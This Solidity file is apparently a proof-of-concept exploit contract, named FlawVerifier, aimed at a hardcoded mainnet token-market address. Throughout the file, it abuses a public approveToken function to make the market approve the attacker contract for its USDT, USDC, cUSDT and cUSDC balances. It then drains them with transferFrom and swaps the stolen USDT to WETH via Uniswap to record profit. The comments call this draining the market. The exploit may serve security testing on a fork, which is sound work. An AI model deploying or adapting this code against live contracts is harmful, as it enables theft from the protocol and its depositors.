// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IDepTokenApprovalBug {
    function approveToken(address token, address spender, uint256 amount) external returns (bool);
    function underlying() external view returns (address);
    function USDT_ADDRESS() external view returns (address);
    function USDC_ADDRESS() external view returns (address);
}

interface IUniswapV2RouterLike {
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

contract FlawVerifier {
    address internal constant TARGET = 0x7b190a928Aa76EeCE5Cb3E0f6b3BdB24fcDd9b4f;

    address internal constant CANONICAL_USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address internal constant CANONICAL_USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant CANONICAL_CUSDT = 0xf650C3d88D12dB855b8bf7D11Be6C55A4e07dCC9;
    address internal constant CANONICAL_CUSDC = 0x39AA39c021dfbaE8faC545936693aC917d5E7563;
    address internal constant CANONICAL_WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant UNISWAP_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;

    IDepTokenApprovalBug internal constant TARGET_CONTRACT = IDepTokenApprovalBug(TARGET);

    address internal _profitToken;
    uint256 internal _profitAmount;

    constructor() {}

    function executeOnOpportunity() external {
        address underlyingToken = _readAddress(
            abi.encodeWithSelector(IDepTokenApprovalBug.underlying.selector),
            CANONICAL_USDT
        );
        address usdtToken = _readAddress(
            abi.encodeWithSelector(IDepTokenApprovalBug.USDT_ADDRESS.selector),
            CANONICAL_USDT
        );
        address usdcToken = _readAddress(
            abi.encodeWithSelector(IDepTokenApprovalBug.USDC_ADDRESS.selector),
            CANONICAL_USDC
        );

        address[5] memory candidates = [underlyingToken, usdtToken, CANONICAL_CUSDT, usdcToken, CANONICAL_CUSDC];

        // Exploit path 1:
        // Call approveToken(USDTAddress, attacker, amount) on the live market.
        // Exploit path 2:
        // Call the approved token's transferFrom(depToken, attacker, amount).
        _approveAndPullFromMarket(usdtToken);

        // Exploit path 1 variant:
        // Call approveToken(compoundV2cUSDTAddress, attacker, amount) on the live market.
        // Exploit path 2:
        // Call the approved cUSDT token's transferFrom(depToken, attacker, amount).
        _approveAndPullFromMarket(CANONICAL_CUSDT);

        // Exploit path 3:
        // Repeat for each additional ERC20 balance currently held by the market.
        // These are realistic public discovery steps that preserve the same root cause:
        // a public arbitrary approval followed by token.transferFrom.
        for (uint256 i = 0; i < candidates.length; i++) {
            address token = candidates[i];
            if (_alreadySeen(candidates, i, token)) {
                continue;
            }
            _approveAndPullFromMarket(token);
        }

        _realizeProfitToWETHIfPossible(usdtToken);
        _refreshProfit(candidates);
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _approveAndPullFromMarket(address token) internal {
        if (token == address(0)) {
            return;
        }

        uint256 marketBalance = _balanceOf(token, TARGET);
        if (marketBalance == 0) {
            return;
        }

        // The vulnerable public function ultimately performs ERC20 approve from the market itself.
        // Resetting to zero first keeps the exploit compatible with tokens like USDT that reject
        // non-zero to non-zero allowance changes. This is still the same exploit causality:
        // public approveToken, then transferFrom to steal the market's balance.
        require(TARGET_CONTRACT.approveToken(token, address(this), 0), "approve zero failed");
        require(TARGET_CONTRACT.approveToken(token, address(this), marketBalance), "approve amount failed");
        require(_rawTransferFrom(token, TARGET, address(this), marketBalance), "transferFrom failed");
    }

    function _realizeProfitToWETHIfPossible(address usdtToken) internal {
        if (usdtToken == address(0)) {
            return;
        }

        uint256 stolenUsdt = _balanceOf(usdtToken, address(this));
        if (stolenUsdt == 0) {
            return;
        }

        // The exploit is already complete at this point: the market has been drained via
        // public approveToken -> token.transferFrom. Swapping the stolen USDT into WETH is
        // a realistic public on-chain realization step using only verifier-held assets so
        // the PoC reports profit in an 18-decimal token that already exists on the fork.
        _forceApprove(usdtToken, UNISWAP_V2_ROUTER, stolenUsdt);

        address[] memory path = new address[](2);
        path[0] = usdtToken;
        path[1] = CANONICAL_WETH;

        IUniswapV2RouterLike(UNISWAP_V2_ROUTER).swapExactTokensForTokens(
            stolenUsdt,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function _refreshProfit(address[5] memory candidates) internal {
        _profitToken = address(0);
        _profitAmount = 0;

        _updateProfit(CANONICAL_WETH);

        for (uint256 i = 0; i < candidates.length; i++) {
            address token = candidates[i];
            if (_alreadySeen(candidates, i, token) || token == address(0)) {
                continue;
            }

            _updateProfit(token);
        }
    }

    function _updateProfit(address token) internal {
        uint256 tokenBalance = _balanceOf(token, address(this));
        if (tokenBalance > _profitAmount) {
            _profitToken = token;
            _profitAmount = tokenBalance;
        }
    }

    function _balanceOf(address token, address account) internal view returns (uint256 amount) {
        (bool ok, bytes memory data) = token.staticcall(
            abi.encodeWithSelector(IERC20Like.balanceOf.selector, account)
        );
        if (!ok || data.length < 32) {
            return 0;
        }
        return abi.decode(data, (uint256));
    }

    function _rawTransferFrom(address token, address from, address to, uint256 amount) internal returns (bool) {
        (bool ok, bytes memory data) = token.call(
            abi.encodeWithSelector(IERC20Like.transferFrom.selector, from, to, amount)
        );
        if (!ok) {
            return false;
        }
        if (data.length == 0) {
            return true;
        }
        return abi.decode(data, (bool));
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        require(_rawApprove(token, spender, 0), "approve reset failed");
        require(_rawApprove(token, spender, amount), "approve failed");
    }

    function _rawApprove(address token, address spender, uint256 amount) internal returns (bool) {
        (bool ok, bytes memory data) = token.call(
            abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount)
        );
        if (!ok) {
            return false;
        }
        if (data.length == 0) {
            return true;
        }
        return abi.decode(data, (bool));
    }

    function _readAddress(bytes memory callData, address fallbackValue) internal view returns (address) {
        (bool ok, bytes memory data) = TARGET.staticcall(callData);
        if (!ok || data.length < 32) {
            return fallbackValue;
        }

        address decoded = abi.decode(data, (address));
        if (decoded == address(0)) {
            return fallbackValue;
        }
        return decoded;
    }

    function _alreadySeen(address[5] memory values, uint256 end, address needle) internal pure returns (bool) {
        if (needle == address(0)) {
            return true;
        }

        for (uint256 i = 0; i < end; i++) {
            if (values[i] == needle) {
                return true;
            }
        }

        return false;
    }
}
